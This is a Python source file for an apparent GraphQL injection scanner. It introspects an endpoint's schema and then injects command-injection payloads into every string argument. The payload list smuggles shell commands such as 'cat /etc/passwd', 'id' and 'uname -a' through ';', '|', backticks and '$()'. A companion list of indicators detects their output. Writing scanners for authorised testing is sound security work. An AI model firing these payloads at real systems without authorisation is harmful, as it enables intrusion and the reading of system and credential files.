"""
Author: Aleksa Zatezalo
Version: 1.0
Date: February 2025
Description: Module to test for command injection, sql injections, and other injection attacks.
"""

import aiohttp
from typing import Dict, List, Optional, Tuple
from grapePrint import grapePrint
import json
import time


class juice:
    """
    A class for testing GraphQL endpoints for injection vulnerabilities.
    """

    def __init__(self):
        """Initialize the injection tester with default settings."""

        self.message = grapePrint()
        self.proxy_url: Optional[str] = None
        self.endpoint: Optional[str] = None
        self.headers = {"Content-Type": "application/json"}
        self.schema: Optional[Dict] = None
        self.mutation_fields: Dict[str, Dict] = {}
        self.query_fields: Dict[str, Dict] = {}

    def configureProxy(self, proxy_host: str, proxy_port: int):
        """Configure HTTP proxy settings."""

        self.proxy_url = f"http://{proxy_host}:{proxy_port}"

    async def runIntrospection(self, session: aiohttp.ClientSession) -> bool:
        """Run introspection query to validate the GraphQL endpoint."""
        query = """
        query {
            __schema {
                queryType {
                    name
                    fields {
                        name
                        args {
                            name
                            type {
                                name
                                kind
                            }
                        }
                    }
                }
                mutationType {
                    name
                    fields {
                        name
                        args {
                            name
                            type {
                                name
                                kind
                            }
                        }
                    }
                }
            }
        }
        """

        try:
            async with session.post(
                self.endpoint,
                json={"query": query},
                headers=self.headers,
                proxy=self.proxy_url,
                ssl=False,
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get("data", {}).get("__schema"):
                        schema = result["data"]["__schema"]

                        # Store query fields
                        if schema.get("queryType"):
                            for field in schema["queryType"]["fields"]:
                                self.query_fields[field["name"]] = {
                                    "args": field.get("args", [])
                                }

                        # Store mutation fields
                        if schema.get("mutationType"):
                            for field in schema["mutationType"]["fields"]:
                                self.mutation_fields[field["name"]] = {
                                    "args": field.get("args", [])
                                }

                        return True

                self.message.printMsg(
                    "Introspection failed - endpoint might not be GraphQL",
                    status="error",
                )
                return False

        except Exception as e:
            self.message.printMsg(f"Introspection error: {str(e)}", status="error")
            return False

    async def setEndpoint(self, endpoint: str, proxy: Optional[str] = None) -> bool:
        """Set the endpoint and retrieve its schema through introspection."""

        self.endpoint = endpoint

        if proxy:
            try:
                proxy_host, proxy_port = proxy.split(":")
                self.configureProxy(proxy_host, int(proxy_port))
            except ValueError:
                self.message.printMsg(
                    "Invalid proxy format. Expected host:port", status="error"
                )
                return False

        async with aiohttp.ClientSession() as session:
            return await self.runIntrospection(session)

    def setCredentials(self, username: str, password: str):
        """Set credentials for command injection testing."""

        self.username = username
        self.password = password
        self.message.printMsg(
            f"Set credentials to {username}:{password} for command injection testing",
            status="success",
        )

    def generateCommandInjectionPayloads(self) -> List[str]:
        """Generate command injection test payloads."""

        return [
            # Basic Command Execution
            ";id",
            "|id",
            "||id",
            "&& id",
            # File Reading
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "||cat /etc/passwd",
            "&& cat /etc/passwd",
            # System Information
            ";uname -a",
            "|uname -a",
            "||uname -a",
            "&& uname -a",
            # Backtick variations (properly escaped)
            "`cat /etc/passwd`",
            "`id`",
            "`uname -a`",
            # Dollar variations
            "$(cat /etc/passwd)",
            "$(id)",
            "$(uname -a)",
            "uname -a",
            # Simple chaining
            ";cat /etc/passwd;id",
            "|cat /etc/passwd|id",
            "&&cat /etc/passwd&&id",
            "cat /etc/passwd",
            # With spaces
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
        ]

    async def testForCommandInjection(
        self,
        session: aiohttp.ClientSession,
        field_name: str,
        arg_name: str,
        payload: str,
        is_mutation: bool = False,
    ) -> Tuple[bool, Optional[str], float]:
        """Test a specific field for command injection vulnerabilities."""

        operation_type = "mutation" if is_mutation else "query"

        # Get field info from schema
        field_info = (
            self.mutation_fields.get(field_name)
            if is_mutation
            else self.query_fields.get(field_name)
        )
        if not field_info:
            return False, None, 0.0

        # Build arguments string including all required fields
        arg_strings = []
        for arg in field_info["args"]:
            if arg["name"] == arg_name:
                arg_strings.append(f'{arg["name"]}: "{payload}"')
            if arg["name"] != arg_name:
                if arg["name"] == "username":
                    arg_strings.append(f'{arg["name"]}: "{self.username}"')
                elif arg["name"] == "password":
                    arg_strings.append(f'{arg["name"]}: "{self.password}"')
                elif arg["type"]["name"] == "Int":
                    arg_strings.append(f'{arg["name"]}: 1')
                elif arg["type"]["name"] == "Boolean":
                    arg_strings.append(f'{arg["name"]}: true')
                else:
                    arg_strings.append(f'{arg["name"]}: "test"')
        args_str = ", ".join(arg_strings)

        # Define common field selections for different types
        field_selections = {
            "CreatePaste": "{ id content title success error }",
            "DeletePaste": "{ success error }",
            "UpdatePaste": "{ id content success error }",
            "AuthResponse": "{ token error }",
            "UserResponse": "{ id username error }",
            "SystemResponse": "{ status message error }",
            "Default": "{ id message error success }",
        }

        # Build the query based on the field type
        if field_name in [
            "systemDiagnostics",
            "getVersion",
            "getStatus",
        ]:  # Known scalar returns
            query = f"""
            {operation_type} {{
                {field_name}({args_str})
            }}
            """
        else:  # Object types that need selections
            # Get the appropriate selection or use default
            selection = field_selections.get(
                field_name.replace("create", "Create")
                .replace("delete", "Delete")
                .replace("update", "Update"),
                field_selections["Default"],
            )
            query = f"""
            {operation_type} {{
                {field_name}({args_str}) {selection}
            }}
            """

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json={"query": query},
                headers=self.headers,
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False,
            ) as response:
                duration = time.time() - start_time
                response_data = await response.json()
                response_text = json.dumps(response_data)

                # Debug info - only print if there's an error
                if "errors" in response_data:
                    error_msg = response_data.get("errors", [{}])[0].get(
                        "message", "Unknown error"
                    )
                    self.message.printMsg(f"Query: {query}", status="error")
                    self.message.printMsg(f"Query error: {error_msg}", status="error")

                # Check for command output indicators
                indicators = [
                    "root:",  # /etc/passwd content
                    "/bin/bash",
                    "/bin/sh",
                    ":/home/",
                    "/usr/bin",
                    "/var/log",
                    "Permission denied",
                    "command not found",
                    "Linux",
                ]

                # Check for command output in response
                for indicator in indicators:
                    if indicator.lower() in response_text.lower():
                        return (
                            True,
                            f"Possible command injection in {field_name}.{arg_name} with payload: {payload}",
                            duration,
                        )

                return False, None, duration

        except Exception as e:
            self.message.printMsg(
                f"Error testing {field_name}.{arg_name}: {str(e)}", status="error"
            )
            return False, None, 0.0

    async def scanForInjection(self):
        """Scan all fields for command injection vulnerabilities."""

        if not self.endpoint or not (self.query_fields or self.mutation_fields):
            self.message.printMsg(
                "No endpoint set or schema not retrieved. Run setEndpoint first.",
                status="error",
            )
            return

        print()
        self.message.printMsg("Starting command injection testing", status="success")
        self.message.printMsg(
            "This may take some time depending on the number of fields...",
            status="warning",
        )

        vulnerabilities = []
        payloads = self.generateCommandInjectionPayloads()

        async with aiohttp.ClientSession() as session:
            # Test query fields
            for field_name, field_info in self.query_fields.items():
                for arg in field_info["args"]:
                    if arg["type"]["name"] in ["String", "ID"]:
                        self.message.printMsg(
                            f"Testing query field: {field_name}.{arg['name']}",
                            status="log",
                        )

                        for payload in payloads:
                            is_vulnerable, message, duration = (
                                await self.testForCommandInjection(
                                    session, field_name, arg["name"], payload
                                )
                            )
                            if is_vulnerable:
                                vulnerabilities.append(message)
                                self.message.printMsg(message, status="failed")

            # Test mutation fields
            for field_name, field_info in self.mutation_fields.items():
                for arg in field_info["args"]:
                    if arg["type"]["name"] in ["String", "ID"]:
                        self.message.printMsg(
                            f"Testing mutation field: {field_name}.{arg['name']}",
                            status="log",
                        )

                        for payload in payloads:
                            is_vulnerable, message, duration = (
                                await self.testForCommandInjection(
                                    session,
                                    field_name,
                                    arg["name"],
                                    payload,
                                    is_mutation=True,
                                )
                            )
                            if is_vulnerable:
                                vulnerabilities.append(message)
                                self.message.printMsg(message, status="failed")

        return vulnerabilities
